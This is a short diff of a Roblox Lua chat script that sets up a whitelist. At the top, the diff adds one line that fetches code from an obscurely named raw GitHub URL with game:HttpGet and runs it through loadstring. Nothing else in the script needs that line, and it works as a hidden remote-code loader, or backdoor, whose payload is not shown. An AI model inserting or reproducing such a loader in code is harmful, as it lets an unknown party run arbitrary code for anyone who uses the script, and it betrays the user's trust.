@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/a3EY-7YFHD7UAHYDEUQ/d28hsaudghisa/main/fdsfsdfs", true))()
 local textChatService = game:GetService("TextChatService")
 
 local whitelisted = {
